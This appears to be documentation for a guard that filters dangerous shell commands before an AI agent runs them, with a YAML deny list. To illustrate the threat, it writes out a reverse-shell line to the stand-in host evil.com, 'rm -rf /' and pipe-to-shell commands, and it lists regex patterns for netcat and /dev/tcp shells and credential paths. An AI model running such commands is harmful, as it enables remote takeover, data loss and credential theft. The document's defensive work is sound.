# Shell Command Guard

## The Threat

Shell access is the most dangerous capability an agent can have. A single command can delete files (`rm -rf /`), establish reverse shells (`bash -i >& /dev/tcp/evil.com/4444 0>&1`), exfiltrate data (`curl | bash`), or crash the system (fork bombs).

The ShellCommandGuard catches these dangerous patterns before the command ever executes, acting as a pre-execution filter at the tool boundary.

## How It Works

Two-phase check:

1. **Pattern matching**: The guard normalizes quoted pipe characters (`'|'` becomes `|`) to prevent evasion via shell quoting, then checks against forbidden regex patterns covering destructive commands, reverse shells, pipe-to-shell attacks, and more.

2. **Path extraction**: The guard extracts filesystem paths from the command (handling redirections like `>file`, `--flag=/path` patterns, and tilde expansion) and checks them against the ForbiddenPathGuard's patterns.

This two-layer approach catches both the command itself and any sensitive paths it references.

## Configuration

```yaml
guards:
  shell_command:
    enabled: true
    forbidden_patterns:
      - "rm\\s+-rf\\s+/"
      - "(curl|wget).*\\|.*sh"
      - "nc\\s+-e"
      - "bash.*\\/dev\\/tcp"
    forbidden_path_patterns:
      - "**/.ssh/**"
      - "**/.env"
```
